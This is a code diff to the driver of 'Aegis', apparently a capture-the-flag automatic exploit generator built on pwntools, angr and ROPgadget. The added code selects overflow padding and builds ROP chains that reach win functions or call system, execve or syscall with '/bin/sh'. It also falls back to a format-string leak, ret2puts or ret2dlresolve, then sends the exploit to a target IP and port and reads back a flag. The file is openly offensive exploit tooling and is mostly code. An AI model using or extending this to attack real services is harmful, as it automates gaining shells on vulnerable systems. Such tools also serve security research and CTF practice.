@@ -1,10 +1,10 @@
 #!/bin/env python3
-
-import pwn
 import logging
 import argparse
+import os
 
 # from rage.log import aegis_log
+from pwn import *
 from rage.rage import rAEG
 from rage.machine import Machine
 from rage.against import Against
@@ -14,11 +14,11 @@ class Aegis:
     """Class that does the control flow for analysis and execution."""
 
     def __init__(self, binary, libc, ip, port):
-        """Initialize important variables for the binary."""
-        self.binary = binary
-        self.elf = pwn.ELF(binary)
+        """Initiaize important variables for the binary."""
+        self.binary = os.path.abspath(binary)
+        self.elf = ELF(binary)
         if libc is not None:
-            self.libc = pwn.ELF(libc)
+            self.libc = ELF(libc)
         else:
             self.libc = self.elf.libc
 
@@ -31,6 +31,10 @@ class Aegis:
 
         self.symbol = rAEG(self.binary)
         self.machine = Machine(self.binary)
+        
+        self.static_analysis() 
+        self.against = Against(self.binary, self.libc, self.machine, self.ip, self.port)
+
 
         self.symbolic_padding = None
 
@@ -39,9 +43,6 @@ class Aegis:
         self.machine.check_mitigations()
         self.machine.check_vulnerable_copy()
         self.machine.check_vulnerable_input()
-        printf_addresses = self.machine.check_vulnerable_printf()
-        self.machine.find_win_gadget()
-        self.machine.find_string_address()
 
     def symbolic_analysis(self):
         """Set variables from the output of the symbolic analysis."""
@@ -49,13 +50,54 @@ class Aegis:
         self.symbolic_padding = self.symbol.symbolic_padding
         return None
 
-    def determine_exploit(self):
+    def setup_exploit(self):
         """Choose which exploit to do for the binary."""
+        
+        win_gadget = self.machine.find_win_gadget()
+        function = self.machine.find_functions(["win", "system", "execve", "syscall"])[0]
+        string = self.machine.find_string_address()
+        printf_addresses = self.machine.check_vulnerable_printf()
+        self.against.chain = b""
+        writeable = None
 
-        # Check if return to win
+        # Choose the right padding size
+        if self.symbolic_padding != None:
+            if self.machine.padding_size == len(self.symbolic_padding):
+                self.against.padding = self.symbolic_padding
+            else:
+                self.against.padding = b"A" * self.machine.padding_size
+        else:
+            self.against.padding = b"A" * self.machine.padding_size
 
-        # Check if rop function call
+        if not string:
+            self.against.chain += self.against.rop_chain_write_string(b"/bin/sh", writeable)
 
+        # Check if one call functions are in the binary
+        if win_gadget:
+            self.against.chain += p64(win_gadget)
+        elif function == "win":
+            self.against.chain += self.against.rop_chain_call_function(function, [0x1, 0x2, 0x3])
+        elif function == "system":
+            if string:
+                self.against.chain += self.against.rop_chain_call_function(function, [string])
+        elif function == "execve":
+            if string:
+                self.against.chain += self.against.rop_chain_call_function(function, [string, 0, 0])
+        elif function == "syscall":
+            if string:
+                self.against.chain += self.against.rop_chain_call_function(function, [59, string, 0, 0])
+        else:
+            # Check if format string vulnerability 
+            if printf_addresses:
+                self.against.format_leak()
+            
+            else:
+                if len(self.machine.find_functions(["puts, printf"])) > 0 and self.machine.find_reg_gadget("rdi") != None:
+                    self.against.chain = self.against.rop_ret2puts()
+                # Check for ret2dlresolve
+                elif len(self.machine.find_functions(["gets"])) > 0 and self.machine.find_reg_gadget("rdi") != None:
+                    self.against.chain = self.against.rop_chain_dlresolve()
+                
 
         return None
 
@@ -65,10 +107,10 @@ class Aegis:
 
     def exploit(self):
         """Create and run exploit using Against module."""
-        function = "win"
-        self.against = Against(self.binary, self.libc, self.machine, self.ip, self.port)
-        self.against.rop_ret2puts()
-        self.against.rop_chain_call_function(function, [])
+        p = self.against.start("")
+        self.against.send_exploit(p, self.against.exploit)
+        self.against.recieve_flag(p)
+        self.against.verify_flag(p)
 
         return None
 
@@ -105,7 +147,6 @@ def print_title():
 
 if __name__ == "__main__":
 
-
     logging.getLogger("angr").setLevel(logging.CRITICAL)
     logging.getLogger("os").setLevel(logging.CRITICAL)
     logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
@@ -115,7 +156,6 @@ if __name__ == "__main__":
         prog = "Aegis",
         description = "An automatic exploit generator framework using binaryninja, angr, ROPgadget, and pwntools"
     )
-
 
     parser.add_argument("-bin", metavar="binary", type=str, help="The binary that is to be exploited", default=None)
     parser.add_argument("-libc", metavar="libc", type=str, help="The libc shared library object linked to the binary", default=None)
@@ -131,4 +171,5 @@ if __name__ == "__main__":
     aeg = Aegis(arguments.bin, arguments.libc, arguments.ip, arguments.port)
     aeg.static_analysis()
     aeg.symbolic_analysis()
+    aeg.setup_exploit()
     aeg.exploit()
